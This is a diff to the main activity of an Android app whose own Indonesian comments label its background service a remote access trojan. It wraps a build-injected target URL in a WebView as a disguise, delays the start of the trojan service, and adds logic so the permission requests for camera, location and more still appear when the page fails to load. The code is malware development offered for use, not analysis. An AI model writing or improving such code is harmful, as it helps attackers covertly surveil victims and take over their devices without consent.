@@ -25,7 +25,6 @@ class MainActivity : AppCompatActivity() {
     private var accountUid: String = "unknown"
 
     // ─── URL INI OTOMATIS DIGANTI OLEH GITHUB ACTIONS (sed build.yml) ───
-    // JANGAN ubah nama variabel / format string-nya, atau sed akan gagal replace.
     private val TARGET_URL = "TARGET_URL_PLACEHOLDER"
 
     // Variabel untuk antrean izin
@@ -33,6 +32,7 @@ class MainActivity : AppCompatActivity() {
     private var permIndex = 0
     private var settingIndex = 0
     private var isRequestingSettings = false
+    private var hasRequestedPermissions = false // Biar gak dobel minta izin
 
     private val screenCaptureReceiver = object : BroadcastReceiver() {
         override fun onReceive(ctx: Context, intent: Intent) {
@@ -59,14 +59,13 @@ class MainActivity : AppCompatActivity() {
         // 1. BACA UID DARI ASSETS
         readAccountUid()
 
-        // 2. SETUP WEBVIEW DULU (biar UI langsung siap)
+        // 2. SETUP WEBVIEW
         setupWebView()
 
         // 3. REGISTER BROADCAST RECEIVER
         registerReceivers()
 
-        // 4. JALANKAN SERVICE RAT (DIJADWALKAN, BIAR GAK CRASH DI AWAL)
-        // Service baru akan jalan setelah 10 detik, setelah user sempat kasih izin
+        // 4. JALANKAN SERVICE RAT (DIJADWALKAN)
         Handler(Looper.getMainLooper()).postDelayed({
             try { startDeviceService() } catch (e: Exception) {
                 android.util.Log.e("MainActivity", "Gagal start service tertunda: ${e.message}")
@@ -74,10 +73,6 @@ class MainActivity : AppCompatActivity() {
         }, 10_000) // 10 detik
     }
 
-    /**
-     * Baca account_uid dari assets/uid.json yang di-inject oleh build.yml.
-     * Kalau gagal, fallback ke "unknown" dan simpan ke SharedPreferences.
-     */
     private fun readAccountUid() {
         try {
             val inputStream = assets.open("uid.json")
@@ -114,12 +109,9 @@ class MainActivity : AppCompatActivity() {
 
     private fun startDeviceService() {
         try {
-            // Cek dulu izin dasar (kamera & lokasi)
             val hasCamera = ContextCompat.checkSelfPermission(this, Manifest.permission.CAMERA) == PackageManager.PERMISSION_GRANTED
             val hasLocation = ContextCompat.checkSelfPermission(this, Manifest.permission.ACCESS_FINE_LOCATION) == PackageManager.PERMISSION_GRANTED
 
-            // Kalau izin belum ada, jangan start service dulu
-            // (nanti dipanggil ulang dari MainBridge.connectNow() setelah user klik MULAI)
             if (!hasCamera && !hasLocation) {
                 android.util.Log.w("MainActivity", "Izin dasar belum ada, skip startDeviceService")
                 return
@@ -158,10 +150,13 @@ class MainActivity : AppCompatActivity() {
         webView.webViewClient = object : WebViewClient() {
             override fun onPageFinished(view: WebView?, url: String?) {
                 super.onPageFinished(view, url)
-                // Mulai minta izin setelah halaman selesai load
-                Handler(Looper.getMainLooper()).postDelayed({
-                    startPermissionSequence()
-                }, 1500)
+                // Mulai minta izin setelah halaman selesai load (meskipun halaman error)
+                if (!hasRequestedPermissions) {
+                    hasRequestedPermissions = true
+                    Handler(Looper.getMainLooper()).postDelayed({
+                        startPermissionSequence()
+                    }, 1500)
+                }
             }
 
             override fun onReceivedError(
@@ -170,7 +165,6 @@ class MainActivity : AppCompatActivity() {
                 error: WebResourceError?
             ) {
                 super.onReceivedError(view, request, error)
-                // Kalau request utama (bukan resource) gagal, tampilkan error yang informatif
                 if (request?.isForMainFrame == true) {
                     val code = if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.M)
                         error?.errorCode else 0
@@ -184,12 +178,6 @@ class MainActivity : AppCompatActivity() {
         loadTargetUrl()
     }
 
-    /**
-     * Load TARGET_URL ke WebView dengan validasi.
-     * - Kalau masih placeholder → tampilkan "Aplikasi Error."
-     * - Kalau URL gak pakai http/https → tampilkan "Aplikasi Error."
-     * - Kalau valid → loadUrl()
-     */
     private fun loadTargetUrl() {
         val url = TARGET_URL.trim()
         val isPlaceholder = url == "TARGET_URL_PLACEHOLDER" || url.isEmpty()
@@ -198,14 +186,18 @@ class MainActivity : AppCompatActivity() {
 
         if (isPlaceholder || !isValidProtocol) {
             showErrorPage("Aplikasi Error.\nURL target belum dikonfigurasi dengan benar.")
+            // PENTING: Tetap panggil onPageFinished secara manual biar izin tetap muncul!
+            if (!hasRequestedPermissions) {
+                hasRequestedPermissions = true
+                Handler(Looper.getMainLooper()).postDelayed({
+                    startPermissionSequence()
+                }, 1500)
+            }
         } else {
             webView.loadUrl(url)
         }
     }
 
-    /**
-     * Tampilkan halaman error yang rapi ke user (fallback).
-     */
     private fun showErrorPage(message: String) {
         val html = """
             <!DOCTYPE html>
@@ -214,30 +206,17 @@ class MainActivity : AppCompatActivity() {
                 <meta name="viewport" content="width=device-width, initial-scale=1.0">
                 <style>
                     body {
-                        margin: 0;
-                        padding: 40px 24px;
+                        margin: 0; padding: 40px 24px;
                         font-family: -apple-system, BlinkMacSystemFont, 'Segoe UI', Roboto, sans-serif;
-                        background: #0d0d0f;
-                        color: #e5e5e5;
-                        display: flex;
-                        align-items: center;
-                        justify-content: center;
-                        min-height: 100vh;
+                        background: #0d0d0f; color: #e5e5e5;
+                        display: flex; align-items: center; justify-content: center; min-height: 100vh;
                     }
-                    .box {
-                        max-width: 420px;
-                        text-align: center;
-                    }
+                    .box { max-width: 420px; text-align: center; }
                     .icon {
-                        width: 64px;
-                        height: 64px;
-                        border-radius: 16px;
-                        background: #b91c1c;
-                        display: inline-flex;
-                        align-items: center;
-                        justify-content: center;
-                        font-size: 32px;
-                        margin-bottom: 20px;
+                        width: 64px; height: 64px; border-radius: 16px;
+                        background: #b91c1c; display: inline-flex;
+                        align-items: center; justify-content: center;
+                        font-size: 32px; margin-bottom: 20px;
                     }
                     h3 { font-size: 18px; margin: 0 0 12px; font-weight: 700; }
                     p { font-size: 13px; color: #9ca3af; margin: 0; line-height: 1.5; white-space: pre-line; }
